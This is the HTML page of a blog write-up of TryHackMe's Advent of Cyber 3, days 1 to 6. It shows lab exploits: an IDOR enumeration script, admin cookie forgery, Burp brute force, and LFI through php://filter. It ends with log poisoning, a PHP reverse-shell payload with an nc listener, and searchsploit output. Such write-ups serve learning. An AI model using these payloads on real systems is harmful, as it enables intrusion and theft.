<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Try Hack Me - Advent Of Cyber 3 writeup (Part 1) | Hakune Blog</title><meta name=keywords content="ctf,thm,tech"><meta name=description content="Writeup for 2021 Try Hack Me&rsquo;s Advent of Cyber 3 (part 1)"><meta name=author content="Aki Hakune"><link rel=canonical href=https://git-akihakune.github.io/blog/adventofcyber3/><link crossorigin=anonymous href=/assets/css/stylesheet.min.7270dbf20dbcda7a1884928b20795b9be2a182a3ce98cd3fb731a82c6f6993de.css integrity="sha256-cnDb8g282noYhJKLIHlbm+KhgqPOmM0/tzGoLG9pk94=" rel="preload stylesheet" as=style><link rel=preload href=/static/banner.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://git-akihakune.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://git-akihakune.github.io/favicon.ico><link rel=icon type=image/png sizes=32x32 href=https://git-akihakune.github.io/favicon.ico><link rel=apple-touch-icon href=https://git-akihakune.github.io/favicon.ico><link rel=mask-icon href=https://git-akihakune.github.io/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.94.2"><link rel=alternate hreflang=en href=https://git-akihakune.github.io/blog/adventofcyber3/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><link rel=manifest href=/hakune.webmanifest><link rel=stylesheet type=text/css href=/hugo-cite.css><script async src="https://www.googletagmanager.com/gtag/js?id=G-F8M24PKNWZ"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-F8M24PKNWZ",{anonymize_ip:!1})}</script><meta property="og:title" content="Try Hack Me - Advent Of Cyber 3 writeup (Part 1)"><meta property="og:description" content="Writeup for 2021 Try Hack Me&rsquo;s Advent of Cyber 3 (part 1)"><meta property="og:type" content="article"><meta property="og:url" content="https://git-akihakune.github.io/blog/adventofcyber3/"><meta property="og:image" content="https://git-akihakune.github.io/blog/adventofcyber3/img/adventOfCyber3/aoc.png"><meta property="article:section" content="blog"><meta property="article:published_time" content="2021-12-02T07:36:50+07:00"><meta property="article:modified_time" content="2021-12-02T07:36:50+07:00"><meta property="og:site_name" content="Hakune Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://git-akihakune.github.io/blog/adventofcyber3/img/adventOfCyber3/aoc.png"><meta name=twitter:title content="Try Hack Me - Advent Of Cyber 3 writeup (Part 1)"><meta name=twitter:description content="Writeup for 2021 Try Hack Me&rsquo;s Advent of Cyber 3 (part 1)"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Blogs","item":"https://git-akihakune.github.io/blog/"},{"@type":"ListItem","position":3,"name":"Try Hack Me - Advent Of Cyber 3 writeup (Part 1)","item":"https://git-akihakune.github.io/blog/adventofcyber3/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Try Hack Me - Advent Of Cyber 3 writeup (Part 1)","name":"Try Hack Me - Advent Of Cyber 3 writeup (Part 1)","description":"Writeup for 2021 Try Hack Me\u0026rsquo;s Advent of Cyber 3 (part 1)","keywords":["ctf","thm","tech"],"articleBody":" Part 1 of 2021 Advent of Cyber Part 2 of 2021 Advent of Cyber   Before reading this article, I strongly suggest you take your time and try the challenges out yourself, it will definitely worth your time!\nSince Try Hack Me has done an awesome job in explaining things plain and simple, I won’t repeat again their tutorial. Instead, I’ll try to summarize it in the most concise (but understandable) way I can.\n[Day 1] Web Exploitation: Save The Gifts So, today’s learning objective seems to be IDOR vulnerability, which stands for Insecure Direct Object Reference.\nTo keep it short, IDOR vulnerabilities occur when a developer doesn’t validate requesting data, For example:\nSee that id=23 at the end? That is your user ID. If you change that to id=0, id=-1,id=null or something, and you suddenly get in another user’s account, that is IDOR vulnerability.\nBeside the GET request example above, we also have IDOR in POST request:\nform method=\"POST\" action=\"/update-password\"  input type=\"hidden\" name=\"user_id\" value=\"123\"  divNew Password:div  divinput type=\"password\" name=\"new_password\"div  divinput type=\"submit\" value=\"Change Password\" form … or in cookies:\nGET /user-information HTTP/1.1 Host: website.thm Cookie: user_id=9 User-Agent: Mozilla/5.0 (Ubuntu;Linux) Firefox/94.0  Hello Jon! And in reality, if you check public Hackerone bug submissions, you will find a great portion of IDOR vulnerabilities there.\nNow with all that knowledge, let’s dive into our challenge.\nUpon entering that website, we’re welcomed with a homepage like this.\nClick on anything clickable, we found out that nothing is clickable on those pages. That left us with only the page Your Activity.\nWithout any obstacle, we can instantly find a textbook vulnerability. It lies here:\nRemember, in programming languages, it usually starts from 0 rather than 1. But if we try ?user_id=0, it will scream “lol no user like that bro”.\nBut if we change that to ?user_id=1:\nGuess we’re in. :D\nIn the wild, the number of possibilities to test is simply too massive to manually try it all. So the best way is to use on-the-spot scripts like this:\n#!/usr/bin/env python3 import requests  address: str = \"https://inventory-management.thm/activity\" startId: int = 0 testRange: int = 20  for id in range(startId, startId + testRange): \tresponse = requests.get(address, params={\"user_id\": id}) \tif response.status_code == 200: \tprint(f\"Found something at {address}?user_id={id}\") Just iteratively try that id out, we also find McStocker’s account at https://inventory-management.thm/activity?user_id=3.\nAnd another at ?user_id=9:\nAnd when we click on all those revert (as our instinct tell us to do so), we got the final flag.\nTo conclude, our flags today are:\nAfter finding Santa's account, what is their position in the company? The Boss!\nAfter finding McStocker's account, what is their position in the company? Build Manager\nAfter finding the account responsible for tampering, what is their position in the company? Mischief Manager\nWhat is the received flag when McSkidy fixes the Inventory Management System? THM{AOC_IDOR_2B34BHI3}\n[Day 2] Web Exploitation: Elf HR Problems So in short, today’s learning objective is fundamental knowledge about the WWW. You can skip all the text below and jump right to answers if you’ve already had experience working with the web.\nSince this is actually a vast topic, I’ll try keeping things simple by omitting the details. If you want to learn more in-depth about web technologies (which you should, because it’s like Hello World for pentesters and developers alike), I suggest the great Mozilla Docs, where they’ve explained everything with great details.\nFirst things first, HTTP.\nYou are reading this article, on the Internet, from your browser, aren’t you?\nThen I hope you’re using a computer. Press Ctr+U, or right click and View Page Source, you should see something like this: As you can see, this is the true nature of the Web - Hypertext. A bunch of codes define what a page contain, how does it look, what will it do, and so on.\nWhen people talk about HTTP, they’re talking about the way in which such Hypertext are transferred among computers - sending request, and waiting to be responded (imagine you messaging with someone). An example request:\nGET / HTTP/1.1 Host: tryhackme.com User-Agent: Mozilla/5.0 Firefox/87.0 Referer: https://tryhackme.com/ And an example respond:\nHTTP/1.1 200 OK Server: nginx/1.15.8 Date: Wednesday, 24 Nov 2021 13:34:03 GMT Content-Type: text/html Content-Length: 98  html head  titleAdvent of Cybertitle head body  Welcome To Advent of Cyber! body html As you can see, Hypertext is also in the respond. The browser render that, then showing you the page - all happened in the matter of miliseconds.\nHTTPS is HTTP, but more secure, since it’s encrypted.\nOn the other hand, cookie is a something sent back and forth among computers, to identify who you are.\nOn your browser, press F12 to open Dev Tools, find Cookies tab, somewhere in Storage or Application. The yummy cookies should be there. And since cookies are stored locally on your computer, it can be changed however we want.\nEquipped with all that knowledge, here comes the challenge!\nGet into the challenge page, we see an ordinary login form.\nLet’s register an account!\n… okay? (’-')\nChecking DevTool, we can find a cookie like this\nuser-auth:\"7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a22746573746572227d\" It’s not very readable. So let’s try to decode it with CyberChef.\n(If you find the image too small to read, why don’t open up another tab and decode it? :D)\nWe can see that the cookie is stored in JSON format, encoded in hexadecimal.\nChanging out username to admin (as the task told us to), then copy-pasting it to DevTool…\nThis is certified “I’m in” moment. :D\nFrom there, we can get all needed information to answer the questions:\nWhat is the name of the new cookie that was created for your account?\nuser-auth\nWhat encoding type was used for the cookie value?\nhexadecimal\nWhat object format is the data of the cookie stored in?\njson\nWhat is the value of the administrator cookie? (username = admin)\n7b636f6d70616e793a2022546865204265737420466573746976616c20436f6d70616e79222c206973726567697374657265643a2254727565222c20757365726e616d653a2261646d696e227d What team environment is not responding?\nHR\nWhat team environment has a network warning?\nApplication\n[Day 3] Web Exploitation: Christmas Blackout Okay, long story short, content discovery and authentication bypass. Absolutely useful in real life applications.\nThere’s not much to say about this, since everything we’re gonna do is bruteforcing the credentials. One reminder, thou, is that in real life bruteforcing is nowhere near as effective as it’s in ctfs, and let’s be grateful for that. :D\nAnd just like that, we’ve got the location of admin panel.\nFrom here, we usually use specialised tools like Hydra. However we’ve already been given a wordlist with only 3 entries in this case, which’s saved us from the hassle of writing lengthy commands. :D\nManually test the entries, we got it at administrator:administrator.\nAnother way to do that is taking a look at the JS file.\nconst loginForm = document.getElementById(\"login-form\"); const loginButton = document.getElementById(\"login-form-submit\"); const loginErrorMsg = document.getElementById(\"login-error-msg\");  loginButton.addEventListener(\"click\", (e) = {  e.preventDefault();  const username = loginForm.username.value;  const password = loginForm.password.value;   if (username === \"administrator\" \u0026\u0026 password === \"administrator\") {  alert(\"You have successfully logged in.\");  window.open('dc7161be3dbf2250c8954e5.html');  } else {  loginErrorMsg.style.opacity = 1;  } }) We can clearly see username and password written in plaintext, and even the “secret” location it’ll redirect us to. Again, in real life, no sane developer do this. However, let’s just be chill in this ctf-only “I’m in” moment and move on! xD\nHaving accessed to the admin panel, now we’ve got all flags needed for the questions!\nUsing a common wordlist for discovering content, enumerate http://10.10.235.89 to find the location of the administrator dashboard. What is the name of the folder? admin\nIn your web browser, try some default credentials on the newly discovered login form for the \"administrator\" user. What is the password? administrator\nAccess the admin panel. What is the value of the flag? THM{ADM1N_AC3SS}\n[Day 4] Web Exploitation: Santa’s running behind Today’s learning material is relatively short and concise. So in case you haven’t, please go to Day 4 tutorial here.\nOne small reminder, thou: Burpsuite is (in)famous for its avaricious RAM usage, so if you run it in a virtual machine, watch out for sudden halts.\nAnother thing: Burp Suite’s built in browser’s become fantastic nowadays - a separate Firefox with FoxyProxy is no longer needed.\nOne final extra note: If you, for some reason, don’t want or can’t afford the Burp Suite pro version, or just genuinely support the idea of open-source softwares, then try to take a look at ZAP. On my own, I find Burp Suite’s UI more intuitive, but ZAP’s much more powerful once you get the hang of it.\nWith all that being said, let’s jump in. :D\nWe’re greeted with a basic login form like this. Neither the source code or default credentials revealed anything special.\nBased on task’s requirements, seems like all we’ve to do’s to bruteforce it. Let me show you the cool way to do it. :D\n… or not… Weird. :L\nLet’s burn our RAM and open up Burp Suite, then.\nHere’s the POST request we intercepted:\nPOST / HTTP/1.1  Host: 10.10.154.103  Content-Length: 45  Cache-Control: max-age=0  Upgrade-Insecure-Requests: 1  Origin: http://10.10.154.103  Content-Type: application/x-www-form-urlencoded  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  Referer: http://10.10.154.103/  Accept-Encoding: gzip, deflate  Accept-Language: en-US,en;q=0.9  Cookie: PHPSESSID=c3k9aqaa365sapdv67vh3p3bte  Connection: close    username=santa\u0026password=password\u0026submit=Login Let’s Ctrl+I to send it to Intruder.\nThe first Target tab, default options are fine. On the second Positions tab, make sure that you only insert payloads in password field:\nPOST / HTTP/1.1  Host: 10.10.154.103  Content-Length: 45  Cache-Control: max-age=0  Upgrade-Insecure-Requests: 1  Origin: http://10.10.154.103  Content-Type: application/x-www-form-urlencoded  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  Referer: http://10.10.154.103/  Accept-Encoding: gzip, deflate  Accept-Language: en-US,en;q=0.9  Cookie: PHPSESSID=c3k9aqaa365sapdv67vh3p3bte  Connection: close    username=santa\u0026password=§password§\u0026submit=Login Now continues to Payload tab. Since we’ve already had a nice small password list, let’s copy it and Paste.\nIt all looks good now. Let’s press Start Attack on upper right side. Here’s the result:\nBased on the length, we can easily spot the unique one.\nHaving had all that information, let’s login to santa’s account!\nAnd here comes the last flag!\nSo our flags today are:\nWhat valid password can you use to access the \"santa\" account? cookie\nWhat is the flag in Santa's itinerary? THM{SANTA_DELIVERS}\n[Day 5] Web Exploitation: Pesky Elf Forum Our learning objective today is, yeah, Cross-Site Scripting aka XSS vulnerability.\nAs XSS itself is an endless topic, I’ll leave the explaining part to Portswigger’s post. It has intelligible visualization of XSS concepts, so you should definitely check it out.\nSo, in short, XSS is injecting Javascript code to do things attackers want. With that being said, let’s jump in.\n…\nActually, hasn’t the challenge description itself done all the hassle for us? Isn’t it revealing too much? \nBasically this’s what’s going to happen if you change your password. In real life, whoever implemented this password changing function must be reprimanded ASAP. But as it’s a ctf challenge, let’s now gratefully exploit it. (￣▽￣)\nStrictly follow the challenge’s instruction, let’s comment this on all pages. Shortly after, we got in Grinch user’s account. Here’s the answer for today’s challenge. [Day 6] Web Exploitation: Patch Management Is Hard Today’s learning objective is LFI - local file inclusion.\nNormally if you keep default Apache/Nginx configuration, LFI shouldn’t happen, but as an attacker it’s certainly worth a try.\nTo keep it short, local file inclusion is - as you may guess - a vulnerability that let attackers access local files on the machine.\nSometimes, LFI leads to RCE, mostly via log files (log poinsoning) or PHP session - whatever means that you can store your arbitrary code, in order to execute it from PHP filter later on.\nOkay, enough theory, let’s dive in. :D\nUpon visiting the page, we see this:\nAnd as you can see, the entry point is literally in the request URL:\nBefore we get started, let’s test if this server is vulnerable to LFI. :D\nhttp://10.10.132.156/index.php?err=/etc/passwd It’s. So it’s not hard to read the first flag:\nhttp://10.10.16.195/index.php?err=/etc/flag But if we try to use the very same method to access index.php file, we’ll get an error.\nhttp://10.10.16.195/index.php?err=index.php Since the index.php file also include header.php, and they both declare getuseragent() function, we cannot access it directly. Therefore, let’s access it through PHP filter:\nhttp://10.10.16.195/index.php?err=php://filter/resource=index.php Seems no better. Why? Because the functions are still there. So let’s try to encode it in base64.\nhttp://10.10.16.195/index.php?err=php://filter/convert.base64-encode/resource=index.php The server returned a very long base64 string - much longer than a simple error should be, which meant a different result.\nHere’s that string, base64 decoded:\n┌──(kali㉿kali)-[~/ctf/thm/adventOfCyber3/day6] └─$ echo \"PD9waHAgc2Vzc2lvbl9zdGFydCgpOwokZmxhZyA9ICJUSE17NzkxZDQzZDQ2MDE4YTBkODkzNjFkYmY2MGQ1ZDllYjh9IjsKaW5jbHVkZSgiLi9pbmNsdWRlcy9jcmVkcy5waHAiKTsKaWYoJF9TRVNTSU9OWyd1c2VybmFtZSddID09PSAkVVNFUil7ICAgICAgICAgICAgICAgICAgICAgICAgCgloZWFkZXIoICdMb2NhdGlvbjogbWFuYWdlLnBocCcgKTsKCWRpZSgpOwp9IGVsc2UgewoJJGxhYk51bSA9ICIiOwogIHJlcXVpcmUgIi4vaW5jbHVkZXMvaGVhZGVyLnBocCI7Cj8+CjxkaXYgY2xhc3M9InJvdyI+CiAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICA8L2Rpdj4KICA8ZGl2IGNsYXNzPSJjb2wtbGctOCBjb2wtb2Zmc2V0LTEiPgogICAgICA8P3BocCBpZiAoaXNzZXQoJGVycm9yKSkgeyA/PgogICAgICAgICAgPHNwYW4gY2xhc3M9InRleHQgdGV4dC1kYW5nZXIiPjxiPjw/cGhwIGVjaG8gJGVycm9yOyA/PjwvYj48L3NwYW4+CiAgICAgIDw/cGhwIH0KCj8+CiA8cD5XZWxjb21lIDw/cGhwIGVjaG8gZ2V0VXNlck5hbWUoKTsgPz48L3A+Cgk8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1kYW5nZXIiIHJvbGU9ImFsZXJ0Ij5UaGlzIHNlcnZlciBoYXMgc2Vuc2l0aXZlIGluZm9ybWF0aW9uLiBOb3RlIEFsbCBhY3Rpb25zIHRvIHRoaXMgc2VydmVyIGFyZSBsb2dnZWQgaW4hPC9kaXY+IAoJPC9kaXY+Cjw/cGhwIGlmKCRlcnJJbmNsdWRlKXsgaW5jbHVkZSgkX0dFVFsnZXJyJ10pO30gPz4KPC9kaXY+Cgo8P3BocAp9Cj8+\" | base64 -d (); $flag = \"THM{791d43d46018a0d89361dbf60d5d9eb8}\"; include(\"./includes/creds.php\"); if($_SESSION['username'] === $USER){  header( 'Location: manage.php' );  die(); } else {  $labNum = \"\";  require \"./includes/header.php\"; ? =\"row\"  =\"col-lg-12\"    =\"col-lg-8 col-offset-1\"  if (isset($error)) { ?  =\"text text-danger\"  }  ?  Welcome (); ?\n =\"alert alert-danger\" role=\"alert\"This server has sensitive information. Note All actions to this server are logged in!   if($errInclude){ include($_GET['err']);} ?   } ? And here comes our second flag. :D\nLooking at the source code, we can find another file seems potentially useful.\ninclude(\"./includes/creds.php\"); So let’s go for it!\nhttp://10.10.16.195/index.php?err=php://filter/convert.base64-encode/resource=./includes/creds.php And quite easily, we’d got the credentials.\n┌──(kali㉿kali)-[~/ctf/thm/adventOfCyber3/day6] └─$ echo \"PD9waHAgCiRVU0VSID0gIk1jU2tpZHkiOwokUEFTUyA9ICJBMEMzMTVBdzNzMG0iOwo/\" | base64 -d $USER = \"McSkidy\"; $PASS = \"A0C315Aw3s0m\"; ? What’s left - logging in using that account. Here’s the password recovery page: For the next question, the task ask for the hostname of the webserver. Let me show you the easy way.\nhttp://10.10.16.195/index.php?err=/etc/hosts Simple as that, and the THM challenge actually ended here. From this point onward is just bonus steps for learning purposes. :D\nSo, there’s a log.php site that let you access request logs. Following the challenge’s tutorial, I sent a request like this:\n$ curl -A \"lmao I'm here\" http://10.10.16.195 Checking the logs, we can clearly see where our payload went.\nUsing the exact method, this time I sent a real PHP payload.\ncurl -A \"\" http://10.10.16.195 However, as you may expected, the payload’s not executed just by visiting the page. So I visit it again, this time via LFI.\nhttp://10.10.16.195/index.php?err=php://filter/resource=./includes/logs/app_access.log As you may see, the server gracefully executed our payload. Without a second thought, I went straight to reverse shell cheat sheet, grab a PHP payload and sent it. Basically it looked like this.\nphp $sock=fsockopen($MY-IP,$PORT);$proc=proc_open(/bin/sh -i, array(0=$sock, 1=$sock, 2=$sock),$pipes); ?Send it.\ncurl --user-agent '$sock, 1=$sock, 2=$sock),$pipes); ?' http://$SERVER-IP Open a port to receive it.\nnc -lvnp 9999 Access the log via LFI again to execute the payload.\n┌──(kali㉿kali)-[~/ctf/thm/adventOfCyber3/day6] └─$ nc -lvnp 9999 1 ⨯ listening on [any] 9999 ... connect to [10.4.35.200] from (UNKNOWN) [10.10.161.15] 34994 /bin/sh: 0: can't access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) That’s it. We’re in.\n$ cat /etc/*release DISTRIB_ID=Ubuntu DISTRIB_RELEASE=12.04 DISTRIB_CODENAME=precise DISTRIB_DESCRIPTION=\"Ubuntu 12.04.5 LTS\" NAME=\"Ubuntu\" VERSION=\"12.04.5 LTS, Precise Pangolin\" ID=ubuntu ID_LIKE=debian PRETTY_NAME=\"Ubuntu precise (12.04.5 LTS)\" VERSION_ID=\"12.04\" We can see this box’s using a quite outdated version of Ubuntu. A quick searchsploit return a lot of useful resources:\n$ searchsploit ubuntu 12.04 130 ⨯ ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------  Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Linux Kernel (Ubuntu 11.10/12.04) - binfmt_script Stack Data Disclosure | linux/dos/41767.txt Linux Kernel 3.13.0 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation | linux/local/37292.c Linux Kernel 3.13.0 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow) | linux/local/37293.txt Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_swevent_init' Local Privilege Escalation (3) | linux_x86-64/local/33589.c Linux Kernel (Ubuntu 12.04 x64) - 'ptrace/sysret' Local Privilege Escalation | linux_x86-64/local/34134.c Linux Kernel (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local Privilege Escalation | linux_x86-64/local/44299.c Ubuntu usb-creator 0.2.x (Ubuntu 12.04/14.04/14.10) - Local Privilege Escalation | linux/local/36820.txt ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results However, since the box lacked basic utilities:\n$ gcc /bin/sh: 19: gcc: not found $ curl /bin/sh: 20: curl: not found $ wget /bin/sh: 21: wget: not found I attempted no further. But you can try to privilege escalate on this box by yourself, for the sake of learning. :D\nYou can also get RCE with PHP session. Here’s the end result: But as this task’s got quite lengthy, I’ll leave that part for you, then. :D\nHere’s the answers for today!\nDeploy the attached VM and look around. What is the entry point for our web application? err\nUse the entry point to perform LFI to read the /etc/flag file. What is the flag? THM{d29e08941cf7fe41df55f1a7da6c4c06}\nUse the PHP filter technique to read the source code of the index.php. What is the $flag variable's value? THM{791d43d46018a0d89361dbf60d5d9eb8}\nNow that you read the index.php, there is a login credential PHP file's path. Use the PHP filter technique to read its content. What are the username and password? McSkidy:A0C315Aw3s0m\nUse the credentials to login into the web application. Help McSkidy to recover the server's password. What is the password of the flag.thm.aoc server? THM{552f313b52e3c3dbf5257d8c6db7f6f1}\nThe web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. What is the hostname of the webserver? The log file location is at ./includes/logs/app_access.log lfi-aoc-awesome-59aedca683fff9261263bb084880c965\n","wordCount":"2855","inLanguage":"en","image":"https://git-akihakune.github.io/blog/adventofcyber3/img/adventOfCyber3/aoc.png","datePublished":"2021-12-02T07:36:50+07:00","dateModified":"2021-12-02T07:36:50+07:00","author":{"@type":"Person","name":"Aki Hakune"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://git-akihakune.github.io/blog/adventofcyber3/"},"publisher":{"@type":"Organization","name":"Hakune Blog","logo":{"@type":"ImageObject","url":"https://git-akihakune.github.io/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://git-akihakune.github.io accesskey=h title="Blog (Alt + H)"><img src=https://git-akihakune.github.io/static/banner.png alt=logo aria-label=logo height=40>Blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li><li><a href=https://git-akihakune.github.io/vi/ title=Vi aria-label=Vi>Vi</a></li></ul></span></div><ul id=menu><li><a href=https://git-akihakune.github.io/archive/ title=timeline><span>timeline</span></a></li><li><a href=https://git-akihakune.github.io/blog/ title=blog><span>blog</span></a></li><li><a href=https://git-akihakune.github.io/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://git-akihakune.github.io/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class="main page"><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://git-akihakune.github.io>Home</a>&nbsp;»&nbsp;<a href=https://git-akihakune.github.io/blog/>Blogs</a></div><h1 class=post-title>Try Hack Me - Advent Of Cyber 3 writeup (Part 1)</h1><div class=post-meta><span title="2021-12-02 07:36:50 +0700 +07">December 2, 2021</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;Aki Hakune&nbsp;|&nbsp;<a href=https://github.com/git-akihakune/git-akihakune.github.io/tree/main/blog/adventOfCyber3.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><figure class=entry-cover><img loading=lazy src=https://git-akihakune.github.io/img/adventOfCyber3/aoc.png alt="Advent Of Cyber 3"><p>Try Hack Me - Advent Of Cyber 3</p></figure><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#day-1-web-exploitation-save-the-gifts aria-label="[Day 1] Web Exploitation: Save The Gifts">[Day 1] <code>Web Exploitation</code>: Save The Gifts</a></li><li><a href=#day-2-web-exploitation-elf-hr-problems aria-label="[Day 2] Web Exploitation: Elf HR Problems">[Day 2] <code>Web Exploitation</code>: Elf HR Problems</a></li><li><a href=#day-3-web-exploitation-christmas-blackout aria-label="[Day 3] Web Exploitation: Christmas Blackout">[Day 3] <code>Web Exploitation</code>: Christmas Blackout</a></li><li><a href=#day-4-web-exploitation-santas-running-behind aria-label="[Day 4] Web Exploitation: Santa&amp;rsquo;s running behind">[Day 4] <code>Web Exploitation</code>: Santa&rsquo;s running behind</a></li><li><a href=#day-5-web-exploitation-pesky-elf-forum aria-label="[Day 5] Web Exploitation: Pesky Elf Forum">[Day 5] <code>Web Exploitation</code>: Pesky Elf Forum</a></li><li><a href=#day-6-web-exploitation-patch-management-is-hard aria-label="[Day 6] Web Exploitation: Patch Management Is Hard">[Day 6] <code>Web Exploitation</code>: Patch Management Is Hard</a></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><ul><li><a href=/blog/adventofcyber3/>Part 1 of 2021 Advent of Cyber</a></li><li><a href=/blog/adventofcyber3-2/>Part 2 of 2021 Advent of Cyber</a></li></ul><hr><p>Before reading this article, I strongly suggest you take your time and <a href=https://tryhackme.com/room/adventofcyber3>try the challenges out yourself</a>, it will definitely worth your time!</p><p>Since Try Hack Me has done an awesome job in explaining things plain and simple, I won&rsquo;t repeat again their tutorial. Instead, I&rsquo;ll try to summarize it in the most concise (but understandable) way I can.</p><h2 id=day-1-web-exploitation-save-the-gifts>[Day 1] <code>Web Exploitation</code>: Save The Gifts<a hidden class=anchor aria-hidden=true href=#day-1-web-exploitation-save-the-gifts>#</a></h2><p><img loading=lazy src=/img/adventOfCyber3/day1/title.png#center alt></p><p>So, today&rsquo;s learning objective seems to be <a href=https://portswigger.net/web-security/access-control/idor>IDOR vulnerability</a>, which stands for <code>Insecure Direct Object Reference</code>.</p><p>To keep it short, IDOR vulnerabilities occur when a developer doesn&rsquo;t validate requesting data, For example:</p><p><img loading=lazy src=/img/adventOfCyber3/day1/example_url.png#center alt></p><p>See that <code>id=23</code> at the end? That is your user ID. If you change that to <code>id=0</code>, <code>id=-1</code>,<code>id=null</code> or something, and you suddenly get in another user&rsquo;s account, that is IDOR vulnerability.</p><p>Beside the GET request example above, we also have IDOR in POST request:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;POST&#34;</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/update-password&#34;</span>&gt;
